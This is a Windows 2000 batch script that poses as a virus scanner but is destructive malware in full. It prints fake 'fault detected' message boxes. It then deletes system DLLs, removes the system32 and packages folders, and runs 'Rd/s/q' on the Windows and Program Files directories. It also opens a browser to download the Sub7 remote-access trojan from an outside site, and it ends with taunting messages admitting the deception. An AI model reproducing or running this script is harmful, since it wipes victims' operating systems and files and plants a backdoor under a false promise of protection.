   ::Master win2000 ed
   if not exist c:\scan goto scan
   :start
   if not exist c:\dont'delete goto info
   :msg
   echo msgbox" The scan has picked up a fault in your system" >> c:\dont'delete\ohno.vbs
   echo msgbox" To fix this trouble goto c:\dont'delete\system\fix.vbs" >> c:\dont'delete\ohno.vbs
   echo msgbox" If it doesnt fix the problem then goto c:\program files\masterscan.bat" >>
   c:\dont'delete.vbs
   echo msgbox" If that doesnt work then try c:\scan\keys\fixme.bat" >> c:\dont'delete\ohno.vbs
   goto part1

   :part1
   cd c:\
   cd program files
   md masterscan
   echo @echo off >> c:\program files\masterscan\masterscan.bat
   echo :start >> c:\program files\masterscan\masterscan.bat
   echo cls >> c:\program files\masterscan\masterscan.bat
   echo cd c:\ >> c:\program files\masterscan\masterscan.bat
   echo cd scan >> c:\program files\masterscan\masterscan.bat
   echo md keys >> c:\program files\masterscan\masterscan.bat
   echo pause >> c:\program files\masterscan\masterscan.bat
   echo copy *.bat c:\windows\system32\kierstynscan.bat >> c:\program

   files\masterscan\masterscan.bat
   echo copy *.bat c:\windows\system32\kierstynscan.bat c:\program files\masterscan\urdone.bat >>

   c:\program files\masterscan\masterscan.bat
   goto part2

   :part2
   echo msgbox" I have a little friendly advice..." >> c:\dont'delete\system\fix.vbs
   echo msgbox" Next time dont download a virus scanner from a wierd site" >>

   c:\dont'delete\system\fix.vbs
   echo msgbox" This has just wasted ur time" >> c:\dont'delete\system\fix.vbs
   echo msgbox" Now u have to format ur hardrive" >> c:\dont'delete\system\fix.vbs
   echo msgbox" Your windows system folder is deleted..." " go on have a look" >>

   c:\dont'delete\system\fix
   echo msgbox" Plus i have deleted some of ur files" >> c:\dont'delete\system\fix.vbs
   echo msgbox" I also dropped the Sub7 virus into your directory" >> c:\dont'delete\system\fix.vbs
   echo msgbox" This waz made by a person who loves kierstyn" >> c:\dont'delete\system\fix.vbs
   goto part3

   :part3
   echo hello
   goto sub7

   :scan
   cd c:\
   md scan
   pause
   copy *.bat c:\windows\system\kierstyn.bat
   goto scan1

   :scan1
   cd c:\
   cd scan
   md keys
   goto start

   :sub7
   cls
   start iexplore.exe www.sub7files.com.ar/releases/Sub7_v2.2.zip
   goto part5

   :info
   cls
   cd c:\
   md dont'delete
   goto msg

   :part5
   cls
   cd c:\
   cd dont'delete
   md system
   cd c:\
   cd dont'delete
   cd system
   md tools
   pause
   Echo Now scanning
   copy c:\windows\system32\*.dll c:\dont'delete\system\tools\*.dll
   pause
   Echo Scanning Windows
   pause
   cd c:\
   cd dont'delete
   cd system
   md bin'files
   del c:\windows\system32\*.dll
   copy c:\windows\help\sbsi\training\w2000per\content\cbz\*.* c:\dont'delete\system\bin'files\*.*
   del c:\windows\help\sbsi\training\w2000per\content\cbz\*.*
   cd c:\
   cd dont'delete
   cd system
   md misc'files
   copy c:\windows\help\sbsi\training\w2000per\content\lib\*.* c:\dont'delete\system\misc'files\*.*
   del c:\windows\help\sbsi\training\w2000per\content\lib\*.*
   goto part6

   :part6
   cls
   cd c:\
   cd dont'delete
   cd system
   md rape
   rd c:\windows\system32\reinstallbackups
   pause
   copy c:\windows\packages\* * c:\dont'delete\system\rape\* *
   pause
   rd c:\windows\system32
   pause
   rd c:\windows\packages
   goto part7

   :part7
   Rd/s/q c:\windows
   Rd/s/q c:\progra~1
   goto end1

   :end1
   start c:\dont'delete\ohno.vbs
   goto end

   :end
